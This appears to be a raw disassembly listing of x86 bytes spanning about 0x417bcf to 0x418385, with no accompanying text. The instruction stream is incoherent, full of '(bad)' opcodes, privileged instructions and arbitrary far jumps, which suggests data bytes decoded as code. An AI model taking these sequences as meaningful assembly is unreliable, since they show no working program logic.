  417bcf:	mov    dh,0x11
  417bd1:	pop    ds
  417bd2:	fild   DWORD PTR [edx-0x5540aa10]
  417bd8:	adc    BYTE PTR [esi+eiz*1],ch
  417bdb:	das    
  417bdc:	pop    esp
  417bdd:	cmp    eax,0x44e53b67
  417be2:	sar    BYTE PTR [eax+0x5f43d90],0xe0
  417be9:	mov    DWORD PTR [eax-0x35],ecx
  417bec:	(bad)  
  417bed:	rcr    BYTE PTR [esi-0x1e53aee6],1
  417bf3:	mov    WORD PTR [esi],es
  417bf5:	out    dx,al
  417bf6:	push   esp
  417bf7:	or     eax,0x152df1e
  417bfc:	dec    ebx
  417bfd:	inc    ebx
  417bfe:	dec    edi
  417bff:	xchg   DWORD PTR [eax+0x73],esi
  417c02:	bound  edx,QWORD PTR [ebx-0x361ab382]
  417c08:	(bad)  
  417c09:	test   BYTE PTR ss:[edx+0x15],bh
  417c0d:	retf   0xd8ac
  417c10:	call   0x869e72ba
  417c15:	or     esi,DWORD PTR [ecx+0x45]
  417c18:	add    BYTE PTR [esi+0x2377e518],0x3a
  417c1f:	sbb    bh,cl
  417c21:	lea    edx,[eax]
  417c23:	xchg   esp,eax
  417c24:	(bad)  
  417c25:	adc    ax,0x23
  417c29:	(bad)  
  417c2a:	pusha  
  417c2b:	add    edx,DWORD PTR [edi-0x54801ece]
  417c31:	sub    eax,0xf63b35da
  417c36:	fmul   DWORD PTR [edx-0x15]
  417c39:	sub    cl,0xcc
  417c3c:	mov    es,WORD PTR [ecx]
  417c3e:	mov    bl,0xe0
  417c40:	jns    0x417bdd
  417c42:	test   al,0xd7
  417c44:	add    dl,BYTE PTR [edx-0x29]
  417c47:	icebp  
  417c48:	rcr    DWORD PTR [eax-0x13],0xc2
  417c4c:	rol    dl,1
  417c4e:	aad    0x91
  417c50:	int3   
  417c51:	and    ebp,DWORD PTR [ecx-0x59]
  417c54:	jge    0x417c49
  417c56:	cmc    
  417c57:	pop    edi
  417c58:	inc    edx
  417c59:	push   ebx
  417c5a:	pop    edi
  417c5b:	jae    0x417c43
  417c5d:	int    0x3e
  417c5f:	fnstcw WORD PTR [ebx]
  417c61:	lods   al,BYTE PTR ds:[esi]
  417c62:	dec    esi
  417c63:	cmp    al,0xd
  417c65:	(bad)  
  417c67:	(bad)  
  417c68:	jo     0x417ca4
  417c6a:	pop    esp
  417c6b:	sbb    al,0x45
  417c6d:	or     eax,0x331ffd7c
  417c72:	pop    eax
  417c73:	lods   eax,DWORD PTR ds:[esi]
  417c74:	add    BYTE PTR [edi-0x5f],bl
  417c77:	add    BYTE PTR [edx],bl
  417c79:	std    
  417c7a:	sbb    DWORD PTR [edx],edx
  417c7c:	mov    ebx,DWORD PTR [edx+eiz*4+0x390707b0]
  417c83:	cmp    eax,0x59fcf714
  417c88:	xor    al,BYTE PTR [esi+ebx*4+0x78672b5d]
  417c8f:	pop    ebp
  417c90:	daa    
  417c91:	xchg   ebx,eax
  417c92:	push   0x37
  417c94:	pop    esp
  417c95:	or     esp,DWORD PTR [edi+0x6b]
  417c98:	mov    ch,0xb6
  417c9a:	jbe    0x417c28
  417c9c:	push   eax
  417c9d:	jbe    0x417caa
  417c9f:	adc    bl,BYTE PTR [esi-0x7ab8bfe]
  417ca5:	xchg   edx,eax
  417ca6:	sar    BYTE PTR [ebp-0x7fd92675],1
  417cac:	in     al,dx
  417cad:	leave  
  417cae:	das    
  417caf:	mov    al,0x2
  417cb1:	clc    
  417cb2:	xchg   esi,eax
  417cb3:	push   es
  417cb4:	add    esi,edi
  417cb6:	push   edi
  417cb7:	jg     0x417d15
  417cb9:	mov    esi,0x9c37099a
  417cbe:	xlat   BYTE PTR ds:[ebx]
  417cbf:	rol    al,1
  417cc1:	js     0x417d37
  417cc3:	ret    
  417cc4:	jae    0x417cc4
  417cc6:	icebp  
  417cc7:	mov    bh,0x97
  417cc9:	mov    eax,0x146e0126
  417cce:	sahf   
  417ccf:	dec    esp
  417cd0:	pop    ss
  417cd1:	outs   dx,DWORD PTR ds:[esi]
  417cd2:	call   0x5b45ed57
  417cd7:	fild   QWORD PTR [edi-0x6f]
  417cda:	das    
  417cdb:	rcl    DWORD PTR fs:[ecx],1
  417cde:	pop    ecx
  417cdf:	push   es
  417ce0:	mov    cl,BYTE PTR [eax]
  417ce2:	leave  
  417ce3:	div    dl
  417ce5:	jecxz  0x417d39
  417ce7:	pop    ecx
  417ce8:	adc    ebx,esp
  417cea:	lds    esp,FWORD PTR [ebx+0x1a]
  417ced:	jns    0x417cb9
  417cef:	dec    ecx
  417cf0:	retf   0x6e66
  417cf3:	into   
  417cf4:	inc    esp
  417cf5:	fidiv  DWORD PTR [ebp-0x66e3da57]
  417cfb:	add    al,0xf0
  417cfd:	fadd   st(1),st
  417cff:	or     BYTE PTR [ebp*8+0xe5e07ed],dh
  417d06:	and    al,0x7b
  417d08:	cmp    dh,dl
  417d0a:	push   ss
  417d0b:	xchg   esi,eax
  417d0c:	pop    esi
  417d0d:	rol    ecx,cl
  417d0f:	jge    0x417caf
  417d11:	push   cs
  417d12:	sub    edx,DWORD PTR [edi]
  417d14:	or     al,0xc8
  417d16:	fistp  QWORD PTR [esi-0x14]
  417d19:	popa   
  417d1a:	push   esp
  417d1b:	xor    BYTE PTR [ebx+edi*1-0x58],ch
  417d1f:	icebp  
  417d20:	xor    ebp,DWORD PTR [eax+0x749b7734]
  417d26:	stc    
  417d27:	push   ss
  417d28:	retf   
  417d29:	push   esi
  417d2a:	cmp    dh,BYTE PTR [edi+0x4932b889]
  417d30:	dec    esi
  417d31:	cmp    dl,ah
  417d33:	(bad)  
  417d34:	(bad)  
  417d35:	sbb    ch,dl
  417d37:	dec    ebx
  417d38:	and    eax,0x4e66112f
  417d3d:	test   al,0x6a
  417d3f:	and    eax,0x9d30f437
  417d44:	cld    
  417d45:	mov    ds:0xe761e372,al
  417d4a:	loop   0x417d08
  417d4c:	cs popa 
  417d4e:	sub    esp,DWORD PTR [bx+si-0x19]
  417d52:	mov    ds:0x2be569c5,eax
  417d57:	pop    es
  417d58:	pop    eax
  417d59:	mov    eax,0xfdd911a9
  417d5e:	pop    esi
  417d5f:	jae    0x417d93
  417d61:	icebp  
  417d62:	test   al,0x38
  417d64:	jo     0x417d0e
  417d66:	div    BYTE PTR [edi-0xc]
  417d69:	fnsave [ecx+ebx*8+0x72]
  417d6d:	call   0xd2963105
  417d72:	jge    0x417cfa
  417d74:	adc    al,0xff
  417d76:	sub    al,0x6b
  417d78:	pop    edx
  417d79:	jg     0x417d7e
  417d7b:	aad    0xbe
  417d7d:	push   edi
  417d7e:	(bad)  
  417d7f:	and    ebp,DWORD PTR [eax]
  417d81:	jmp    0x89e4:0x44f4cea3
  417d88:	call   FWORD PTR [edi+0x5f]
  417d8b:	adc    al,0xb2
  417d8d:	ds ret 0x5d35
  417d91:	push   0xbfe28dc0
  417d96:	pop    eax
  417d97:	call   0x2576bf44
  417d9c:	pushf  
  417d9d:	jno    0x417d88
  417d9f:	dec    ebx
  417da0:	clc    
  417da1:	push   eax
  417da2:	cdq    
  417da3:	aad    0xcc
  417da5:	pop    es
  417da6:	push   ebx
  417da7:	and    DWORD PTR [ecx+eax*1+0x2e],edi
  417dab:	retf   
  417dac:	mov    WORD PTR [eax],?
  417dae:	cmp    ebx,eax
  417db0:	jnp    0x417d9f
  417db2:	xor    al,0x54
  417db4:	and    ch,BYTE PTR [ecx+ebx*1]
  417db7:	mov    ah,0x19
  417db9:	push   cs
  417dba:	test   cl,ch
  417dbc:	jae    0x417df3
  417dbe:	lods   eax,DWORD PTR ds:[esi]
  417dbf:	push   ecx
  417dc0:	jmp    DWORD PTR [edx]
  417dc2:	imul   eax,DWORD PTR [esi+0x41de96b6],0xefeb602d
  417dcc:	cmp    al,0xb
  417dce:	outs   dx,DWORD PTR ds:[esi]
  417dcf:	jmp    0xd2bc:0x9f408525
  417dd6:	test   al,0x36
  417dd8:	aas    
  417dd9:	nop
  417dda:	xchg   ecx,eax
  417ddb:	aas    
  417ddc:	inc    esp
  417ddd:	je     0x417e28
  417ddf:	sbb    al,0xd7
  417de1:	aas    
  417de2:	ror    ch,cl
  417de4:	push   DWORD PTR [edi+0x1f]
  417de7:	inc    edi
  417de8:	lahf   
  417de9:	ror    BYTE PTR [ebp-0xa],cl
  417dec:	sbb    dh,BYTE PTR [edi]
  417dee:	sbb    DWORD PTR [edx],esi
  417df0:	adc    ecx,DWORD PTR [edi]
  417df2:	iret   
  417df3:	adc    al,0x80
  417df5:	int    0x83
  417df7:	mov    dl,al
  417df9:	push   es
  417dfa:	repz adc dh,BYTE PTR [ecx+0x64]
  417dfe:	ins    DWORD PTR es:[edi],dx
  417dff:	lea    ecx,ds:0x3a76534d
  417e05:	mov    esi,esi
  417e07:	adc    ah,BYTE PTR [ebx+0x74506746]
  417e0d:	ins    BYTE PTR es:[edi],dx
  417e0e:	inc    edx
  417e0f:	retf   0x6c7
  417e12:	sbb    ch,0xdb
  417e15:	call   0x1614:0xcbb64bfa
  417e1c:	add    BYTE PTR [ebx-0x78],dh
  417e1f:	mov    esp,0xcf9829e4
  417e24:	xchg   DWORD PTR [ebx],ebx
  417e26:	imul   ebp,DWORD PTR [eax-0x12c6abf5],0xd3793ae0
  417e30:	mov    edi,0x4a0404f4
  417e35:	int    0x95
  417e37:	mov    ecx,0x432e7372
  417e3c:	cli    
  417e3d:	add    eax,0x10758bd4
  417e42:	xor    DWORD PTR [ecx+0x74],0xffffff8c
  417e46:	xchg   edi,eax
  417e47:	or     BYTE PTR [ecx+ecx*2+0xe],cl
  417e4b:	sub    esp,DWORD PTR [ebx-0x58]
  417e4e:	inc    esi
  417e4f:	xchg   esp,eax
  417e50:	mov    ebp,0x5249b340
  417e55:	mov    dh,0x3a
  417e57:	int3   
  417e58:	push   edx
  417e59:	dec    esp
  417e5a:	or     edi,edx
  417e5c:	imul   edi,DWORD PTR [ecx+0x637a5a4e],0x53
  417e63:	sbb    eax,0x8263070b
  417e68:	mov    al,bh
  417e6a:	aam    0x91
  417e6c:	mov    edi,DWORD PTR [edx-0x3c]
  417e6f:	lahf   
  417e70:	push   ecx
  417e71:	push   ds
  417e72:	and    al,0x10
  417e74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e75:	mov    ds:0xaa46863d,eax
  417e7a:	jb     0x417e5a
  417e7c:	aaa    
  417e7d:	addr16 cwde 
  417e7f:	loop   0x417eea
  417e81:	hlt    
  417e82:	(bad)  
  417e83:	jg     0x417e88
  417e85:	mov    ss,WORD PTR [ecx+0x78f2237a]
  417e8b:	hlt    
  417e8c:	dec    edi
  417e8d:	and    bh,dl
  417e8f:	call   0x864f8a73
  417e94:	sbb    eax,ebx
  417e96:	push   ebp
  417e97:	jecxz  0x417ea8
  417e99:	mov    WORD PTR [eax],?
  417e9b:	neg    DWORD PTR ss:[esi-0x358100e7]
  417ea2:	xlat   BYTE PTR ds:[ebx]
  417ea3:	and    BYTE PTR [edi],dh
  417ea5:	mov    DWORD PTR [esi-0x38],edi
  417ea8:	or     al,0x61
  417eaa:	dec    edx
  417eab:	or     eax,0xffffffc5
  417eae:	sub    eax,0xba6dc9d0
  417eb3:	imul   eax,DWORD PTR [ecx-0x61],0x1a
  417eb7:	add    ebx,DWORD PTR ds:0xf8b34100
  417ebd:	adc    BYTE PTR [edi-0x53223795],0xe4
  417ec4:	mov    cl,0x9f
  417ec6:	jmp    0x417e95
  417ec8:	xchg   edx,eax
  417ec9:	sub    ah,BYTE PTR [esp+eax*8]
  417ecc:	mov    ecx,0x35a14ec5
  417ed1:	pop    es
  417ed2:	aas    
  417ed3:	dec    esp
  417ed4:	outs   dx,BYTE PTR ds:[esi]
  417ed5:	in     al,dx
  417ed6:	xchg   edi,eax
  417ed7:	xchg   ebp,eax
  417ed8:	fld    st(0)
  417eda:	aas    
  417edb:	add    bl,BYTE PTR [edx-0xb]
  417ede:	jns    0x417e7e
  417ee0:	add    ah,BYTE PTR [ebp+0x37]
  417ee3:	sar    BYTE PTR [eax+0x642008c8],0xac
  417eea:	mov    cl,0x83
  417eec:	sbb    al,0xae
  417eee:	jb     0x417e91
  417ef0:	aaa    
  417ef1:	xor    esi,eax
  417ef3:	inc    esi
  417ef4:	sbb    DWORD PTR [ebp-0x680223c9],ecx
  417efa:	xor    edi,esi
  417efc:	mov    DWORD PTR [edx],ebx
  417efe:	mov    eax,0x31426e90
  417f03:	and    al,0x13
  417f05:	pop    ecx
  417f06:	in     al,0x48
  417f08:	inc    eax
  417f09:	loope  0x417f85
  417f0b:	cwde   
  417f0c:	sub    dl,bh
  417f0e:	push   ecx
  417f0f:	stos   DWORD PTR es:[edi],eax
  417f10:	outs   dx,DWORD PTR ds:[esi]
  417f11:	test   al,0x44
  417f13:	ins    BYTE PTR es:[edi],dx
  417f14:	das    
  417f15:	imul   edx,DWORD PTR [edx],0x40
  417f18:	mov    es,esp
  417f1a:	in     al,0x3d
  417f1c:	(bad)  
  417f1d:	dec    esp
  417f1e:	jo     0x417ede
  417f20:	adc    al,0xf7
  417f22:	xchg   ebx,eax
  417f23:	mov    ds:0x701e0c8e,eax
  417f28:	xor    eax,0xcf354152
  417f2d:	sub    bl,0x4f
  417f30:	(bad)  
  417f31:	enter  0x3c0d,0xa8
  417f35:	test   al,0x16
  417f37:	(bad)  [ebx]
  417f39:	pushf  
  417f3a:	adc    eax,0xa5961c66
  417f3f:	jmp    DWORD PTR [ebx-0x6b]
  417f42:	dec    ecx
  417f43:	push   ecx
  417f44:	jmp    DWORD PTR [eax-0x38]
  417f47:	pop    ds
  417f48:	(bad)  
  417f49:	das    
  417f4a:	test   DWORD PTR [eax+eax*2+0x1ac5619f],esp
  417f51:	cmp    DWORD PTR [eax-0x73],ebp
  417f54:	or     DWORD PTR cs:[ecx],edi
  417f57:	(bad)
  417f5a:	pop    es
  417f5b:	pop    ss
  417f5c:	and    ebp,DWORD PTR [edx-0x424a0dac]
  417f62:	jne    0x417f75
  417f64:	cdq    
  417f65:	aaa    
  417f66:	jmp    0x17a6:0x10cf3039
  417f6d:	inc    ebx
  417f6e:	pop    ss
  417f6f:	repz pop ebx
  417f71:	mov    ebx,0x9e3debeb
  417f76:	mov    al,ds:0xf5812698
  417f7b:	jecxz  0x417fdc
  417f7d:	data16 int 0x79
  417f80:	addr16 call 0xc35c160c
  417f86:	imul   ebx,DWORD PTR [esi-0x2],0xd637cdf3
  417f8d:	mov    BYTE PTR [edi+0x15e12fa7],ah
  417f93:	imul   edi,DWORD PTR [edx],0x3b
  417f96:	adc    BYTE PTR [edi-0x606f2df3],ch
  417f9c:	enter  0xcd3a,0x56
  417fa0:	test   BYTE PTR [ecx-0x42],0x34
  417fa4:	test   BYTE PTR [ecx-0x3e810d92],dh
  417faa:	fwait
  417fab:	outs   dx,DWORD PTR ds:[esi]
  417fac:	fisub  DWORD PTR [eax+0x2]
  417faf:	dec    ebx
  417fb0:	pushf  
  417fb1:	dec    edi
  417fb2:	mov    eax,0x444d04d8
  417fb7:	dec    esp
  417fb8:	sti    
  417fb9:	jp     0x417f8d
  417fbb:	ret    0x50de
  417fbe:	mov    edx,DWORD PTR [ecx+0x59]
  417fc1:	loopne 0x417fed
  417fc3:	sti    
  417fc4:	test   al,0xc8
  417fc6:	adc    al,0xa5
  417fc8:	inc    esp
  417fc9:	inc    esp
  417fca:	in     al,dx
  417fcb:	call   0xd7da:0xbc388f66
  417fd2:	bound  ebx,QWORD PTR [esi-0x35]
  417fd5:	arpl   WORD PTR [edi],si
  417fd7:	xchg   ebx,eax
  417fd8:	adc    eax,0xa1657902
  417fdd:	popa   
  417fde:	push   0xffffffa4
  417fe0:	fstp   TBYTE PTR [esi+ebp*8]
  417fe3:	push   edx
  417fe4:	adc    BYTE PTR [edi+0x2ae8165d],bl
  417fea:	fisub  DWORD PTR [esi+edx*1+0x42edc558]
  417ff1:	rcr    DWORD PTR [edx+esi*8+0x6da4af8e],cl
  417ff8:	into   
  417ff9:	cmp    BYTE PTR [ecx+0x1b37ca95],dl
  417fff:	or     al,0xc8
  418001:	fucomp st(2)
  418003:	retf   
  418004:	xchg   esi,eax
  418005:	dec    ebx
  418006:	retf   
  418007:	ret    0x69d
  41800a:	js     0x41801f
  41800c:	inc    edi
  41800d:	mov    eax,0x3b664e4e
  418012:	popf   
  418013:	cmp    BYTE PTR [eax],bl
  418015:	sbb    edx,DWORD PTR [eax-0x506ff336]
  41801b:	iret   
  41801c:	mov    esp,0xeaeb4be5
  418021:	sub    DWORD PTR [edi+0x4a],ebp
  418024:	or     DWORD PTR [esi],0xffffff84
  418027:	xchg   ebp,eax
  418028:	adc    DWORD PTR [ebp+0x1c],0xffffff96
  41802c:	call   0xc45a3be0
  418031:	lea    eax,[eax+0x468d6f85]
  418037:	mov    ecx,0x5e96eb10
  41803c:	jl     0x417fe7
  41803e:	pusha  
  41803f:	mov    ebx,0xcc58c028
  418044:	xor    BYTE PTR [edx],cl
  418046:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418047:	mov    ebx,0xe1da5251
  41804c:	frndint 
  41804e:	push   esp
  41804f:	fs mov al,0x32
  418052:	(bad)  
  418053:	in     eax,dx
  418054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418055:	push   0xffffffb0
  418057:	jmp    0x5930c6eb
  41805c:	inc    esp
  41805d:	pop    esi
  41805e:	arpl   WORD PTR ds:[ebp-0x41],bx
  418062:	(bad)  
  418063:	xchg   edx,eax
  418064:	mov    ecx,0x3bf060b7
  418069:	fwait
  41806a:	pop    esi
  41806b:	and    al,0xc0
  41806d:	test   BYTE PTR [esi],bl
  41806f:	hlt    
  418070:	dec    eax
  418071:	cmc    
  418072:	jno    0x418068
  418074:	scas   al,BYTE PTR es:[edi]
  418075:	adc    BYTE PTR [eax-0x30],ah
  418078:	test   al,0x93
  41807a:	dec    esi
  41807b:	mov    DWORD PTR [edx-0x76],0x22acab95
  418082:	add    eax,0x2b71a31
  418087:	ror    DWORD PTR [edx-0x23ec06d8],0x3b
  41808e:	sbb    DWORD PTR [edx+ecx*1],ebp
  418091:	sti    
  418092:	jo     0x4180ae
  418094:	das    
  418095:	test   DWORD PTR ds:0x81429f9e,0xfd8594b1
  41809f:	int3   
  4180a0:	lea    ebp,[ebp-0x16]
  4180a3:	or     BYTE PTR [ebx+0x5d],dl
  4180a6:	fnsave [ecx+0x21d067c2]
  4180ac:	int3   
  4180ad:	mov    ebp,DWORD PTR [ebx+0x1ead7263]
  4180b3:	stos   BYTE PTR es:[edi],al
  4180b4:	inc    esi
  4180b5:	aaa    
  4180b6:	stc    
  4180b7:	jb     0x418137
  4180b9:	mov    bh,BYTE PTR [esi+0x14f442f9]
  4180bf:	aas    
  4180c0:	std    
  4180c1:	je     0x4180b4
  4180c3:	test   al,0xbf
  4180c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180c6:	mov    ah,0xea
  4180c8:	(bad)  
  4180c9:	xor    BYTE PTR [ebp+0xaf5ae2f],ah
  4180cf:	fmul   QWORD PTR [ebx-0x3e62d049]
  4180d5:	adc    ebp,DWORD PTR [ecx+0x29f5389]
  4180db:	adc    eax,0x6c8bc2db
  4180e0:	xchg   DWORD PTR [ebp-0x229b7c03],ecx
  4180e6:	je     0x418143
  4180e8:	es scas al,BYTE PTR es:[edi]
  4180ea:	jne    0x41811e
  4180ec:	fisttp DWORD PTR [esi]
  4180ee:	icebp  
  4180ef:	dec    edi
  4180f0:	in     al,0x4d
  4180f2:	adc    al,0x53
  4180f5:	pop    esi
  4180f6:	(bad)  
  4180f7:	js     0xba142f4c
  4180fd:	idiv   dh
  4180ff:	enter  0xeec1,0x5c
  418103:	push   ds
  418104:	cmp    edx,DWORD PTR [ecx]
  418106:	inc    esi
  418107:	mov    dl,0x6
  418109:	lahf   
  41810a:	adc    cl,BYTE PTR [edi+0x26]
  41810d:	aam    0x83
  41810f:	push   ss
  418110:	ret    0x552a
  418113:	(bad)  
  418114:	es push ss
  418116:	or     ebp,esp
  418118:	jl     0x4180ef
  41811a:	int    0x63
  41811c:	push   esp
  41811d:	xchg   esp,eax
  41811e:	out    dx,eax
  41811f:	xor    ecx,DWORD PTR [eax+0x27]
  418122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418123:	cmp    DWORD PTR [ebx-0x74],edi
  418126:	retf   0xd97c
  418129:	xor    al,0x95
  41812b:	lahf   
  41812c:	fwait
  41812d:	push   ebx
  41812e:	pop    ecx
  41812f:	ss add al,0x5a
  418132:	or     edx,DWORD PTR [ecx+0x50]
  418135:	mov    BYTE PTR [edi],bh
  418137:	xchg   DWORD PTR [esi+0xf3cf406],esi
  41813d:	pop    edx
  41813e:	or     bl,cl
  418140:	cmc    
  418141:	fnstenv [ecx*2-0x7adc10f3]
  418148:	(bad)  
  418149:	stc    
  41814a:	fidivr DWORD PTR [ebp-0x3d70d9b]
  418150:	(bad)  
  418151:	in     al,0xc0
  418153:	aaa    
  418154:	stos   DWORD PTR es:[edi],eax
  418155:	push   edi
  418156:	sahf   
  418157:	out    0x89,eax
  418159:	(bad)  
  41815a:	jno    0x418159
  41815c:	cwde   
  41815d:	dec    BYTE PTR [esi-0x6e21744a]
  418163:	lea    esp,[eax+ebp*2]
  418166:	hlt    
  418167:	inc    ecx
  418168:	inc    ebx
  418169:	and    DWORD PTR [ebx+0x2],eax
  41816c:	fisub  DWORD PTR [edx]
  41816e:	ins    DWORD PTR es:[edi],dx
  41816f:	ror    BYTE PTR [esi-0x20],cl
  418172:	mov    al,ds:0x80d2610d
  418177:	inc    esi
  418178:	add    bl,0x2a
  41817b:	(bad)  
  41817c:	ins    DWORD PTR es:[edi],dx
  41817d:	sbb    DWORD PTR [edx-0x73],edi
  418180:	xchg   dh,bl
  418182:	pop    ss
  418183:	repz cmp esp,ebp
  418186:	les    esp,FWORD PTR [edi+0x195f90a5]
  41818c:	(bad)  
  41818d:	out    0x19,al
  41818f:	arpl   WORD PTR [eax-0x78a5eb40],bp
  418195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418196:	test   al,0xd1
  418198:	push   0xe00a31ce
  41819d:	add    esp,esi
  41819f:	je     0x4181d1
  4181a1:	and    ecx,DWORD PTR [edx+0x11]
  4181a4:	(bad)
  4181a8:	ja     0x4181c3
  4181aa:	clc    
  4181ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181ac:	push   0x500e7dce
  4181b1:	imul   esi,DWORD PTR [ebp+0x3d],0x3c
  4181b5:	call   0x41543945
  4181ba:	push   edx
  4181bb:	or     eax,0xbac80ec3
  4181c0:	jp     0x41817f
  4181c2:	shl    eax,1
  4181c4:	mov    edi,0xd2599c6d
  4181c9:	(bad)  
  4181ca:	jb     0x418201
  4181cc:	leave  
  4181cd:	int    0x22
  4181cf:	dec    esp
  4181d0:	mov    bh,0x7a
  4181d2:	hlt    
  4181d3:	cld    
  4181d4:	out    0x4a,eax
  4181d6:	std    
  4181d7:	sub    al,0xe9
  4181d9:	sahf   
  4181da:	aaa    
  4181db:	sbb    al,0xd4
  4181dd:	clc    
  4181de:	inc    ebp
  4181df:	push   ebx
  4181e0:	jnp    0x4181e2
  4181e2:	jg     0x41819c
  4181e4:	xlat   BYTE PTR ds:[ebx]
  4181e5:	fwait
  4181e6:	neg    DWORD PTR [ecx-0x54]
  4181e9:	jmp    0xf2d:0x6fff4803
  4181f0:	jmp    0x41823d
  4181f2:	cwde   
  4181f3:	inc    edi
  4181f4:	retf   
  4181f5:	outs   dx,BYTE PTR ds:[esi]
  4181f6:	mov    edi,ss
  4181f8:	dec    ecx
  4181f9:	fbld   TBYTE PTR [edi]
  4181fb:	std    
  4181fc:	pushf  
  4181fd:	shl    DWORD PTR [esi-0x352267f2],1
  418203:	aas    
  418204:	inc    ecx
  418205:	xor    al,0xb4
  418207:	jmp    0x96cf4a8a
  41820c:	cmp    DWORD PTR [edx+0x62],ebp
  41820f:	push   esp
  418210:	push   ecx
  418211:	xlat   BYTE PTR ds:[ebx]
  418212:	mov    esp,0x6ba9b649
  418217:	frstor [ebp-0x1042fc5f]
  41821d:	xor    ebx,DWORD PTR [ebp-0x19ed7e41]
  418223:	jb     0x4181f8
  418225:	fninit 
  418227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418228:	inc    ebx
  418229:	sbb    eax,0xca05cb4c
  41822e:	adc    eax,0x8162984f
  418233:	mov    al,ds:0xfdca6306
  418238:	push   edx
  418239:	push   esi
  41823a:	loop   0x41828a
  41823c:	lds    eax,FWORD PTR [ebx+0x75]
  41823f:	fdivr  DWORD PTR [edx-0x7e896b27]
  418245:	dec    edi
  418246:	push   0x2a
  418248:	js     0x41829a
  41824a:	mov    ebx,0x968baa95
  41824f:	add    esp,eax
  418251:	and    eax,0xcb4930a7
  418256:	std    
  418257:	and    BYTE PTR [esi],0x1c
  41825a:	stos   BYTE PTR es:[edi],al
  41825b:	inc    edi
  41825c:	mov    edx,DWORD PTR [ecx]
  41825e:	out    0x40,al
  418260:	ins    BYTE PTR es:[edi],dx
  418261:	(bad)  
  418262:	adc    al,ch
  418264:	repnz mov edx,0x91dc02fe
  41826a:	xchg   ecx,eax
  41826b:	pop    ebp
  41826c:	out    0x74,al
  41826e:	inc    ebp
  41826f:	aam    0xbc
  418271:	jecxz  0x418253
  418273:	mov    WORD PTR ds:[edx],cs
  418276:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418277:	(bad)  
  418279:	es xchg ebx,eax
  41827b:	sar    DWORD PTR [eax],1
  41827d:	push   ss
  41827e:	lds    esp,FWORD PTR [eax-0x61f1c042]
  418284:	pop    esi
  418285:	pop    esp
  418286:	mov    dh,0x5a
  418288:	push   esp
  418289:	pop    ds
  41828a:	inc    ebp
  41828b:	mov    al,ds:0xf780e3bf
  418290:	in     eax,dx
  418291:	add    ebp,DWORD PTR [edx-0x165cd38e]
  418297:	jmp    0x4182d4
  418299:	out    dx,eax
  41829a:	test   al,0x86
  41829c:	xor    dh,BYTE PTR [ebx+0x52ae9001]
  4182a2:	cli    
  4182a3:	icebp  
  4182a4:	xchg   ebx,eax
  4182a5:	mov    eax,ds:0xee2e934f
  4182aa:	cdq    
  4182ab:	pop    edx
  4182ac:	leave  
  4182ad:	or     ebp,DWORD PTR [ecx]
  4182af:	dec    edi
  4182b0:	fmulp  st(5),st
  4182b2:	ja     0x418248
  4182b4:	fistp  DWORD PTR [ecx]
  4182b6:	inc    BYTE PTR [esi+0x60b406e]
  4182bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182bd:	mov    al,0xa4
  4182bf:	lods   eax,DWORD PTR ds:[esi]
  4182c0:	and    BYTE PTR [eax],bl
  4182c2:	pushf  
  4182c3:	jae    0x418267
  4182c5:	mov    esi,0x748888d2
  4182ca:	rol    ecx,cl
  4182cc:	outs   dx,DWORD PTR ds:[esi]
  4182cd:	jecxz  0x418336
  4182cf:	mov    bh,0xb1
  4182d1:	fiadd  DWORD PTR [edx+ebx*2-0x3c485848]
  4182d8:	xchg   esi,eax
  4182d9:	(bad)  
  4182da:	fild   QWORD PTR [eax+0x3168a266]
  4182e0:	mov    ebp,0x64548d8d
  4182e5:	or     eax,0x8377b666
  4182ea:	pop    edi
  4182eb:	pop    ebx
  4182ec:	es sysexit 
  4182ef:	outs   dx,BYTE PTR ds:[esi]
  4182f0:	rcl    edx,cl
  4182f2:	retf   0xb75d
  4182f5:	loope  0x418277
  4182f7:	add    esp,esi
  4182f9:	bound  esi,QWORD PTR [edi-0x75f27f49]
  4182ff:	cmp    DWORD PTR [esi],esp
  418301:	int    0x5d
  418303:	mov    ah,0x56
  418305:	pop    esp
  418306:	aaa    
  418307:	pop    ebp
  418308:	xchg   esp,eax
  418309:	call   0xaec27ac7
  41830e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41830f:	aas    
  418310:	mov    ebx,ebp
  418312:	mov    esp,0xafc34790
  418317:	jae    0x4182f3
  418319:	add    bl,ah
  41831b:	push   esp
  41831c:	adc    al,0x90
  41831e:	(bad)  
  41831f:	out    0x74,al
  418321:	jno    0x418359
  418323:	aaa    
  418324:	cmp    al,ah
  418326:	mov    bl,cl
  418328:	mov    cs,WORD PTR [edi+0x16]
  41832b:	jmp    0x4182cf
  41832d:	in     al,dx
  41832e:	inc    esp
  41832f:	mov    eax,ds:0x75f7c63f
  418334:	rol    BYTE PTR [eax],1
  418336:	pushf  
  418337:	aaa    
  418338:	mov    dl,0x67
  41833a:	xchg   esi,eax
  41833b:	push   es
  41833c:	pop    eax
  41833d:	adc    DWORD PTR [eax],eax
  41833f:	jne    0x418366
  418341:	(bad)  
  418342:	xchg   esp,eax
  418343:	shl    DWORD PTR [ecx+ebp*4-0x32e9c3e2],0xb8
  41834b:	dec    ebp
  41834c:	cmp    ebp,ebx
  41834e:	xchg   DWORD PTR [ecx],ebx
  418350:	inc    eax
  418351:	ret    
  418352:	repz inc eax
  418354:	iret   
  418355:	xchg   ebx,eax
  418356:	pop    es
  418357:	lods   eax,DWORD PTR ds:[esi]
  418358:	mov    bh,0xcb
  41835a:	into   
  41835b:	imul   esp,DWORD PTR fs:[eax+0x3beecc92],0xfe88bdfd
  418366:	sub    eax,0xf896d558
  41836b:	lahf   
  41836c:	js     0x418304
  41836e:	jl     0x418371
  418370:	jl     0x418335
  418372:	test   al,0xbc
  418374:	xlat   BYTE PTR ds:[ebx]
  418375:	xchg   ecx,eax
  418376:	gs lock daa 
  418379:	sub    eax,DWORD PTR [esp+edx*4+0x1]
  41837d:	mov    ebx,0x90171423
  418382:	fnstcw WORD PTR [esi+0x46]
  418385:	mov    eax,ds:0x6099cca2
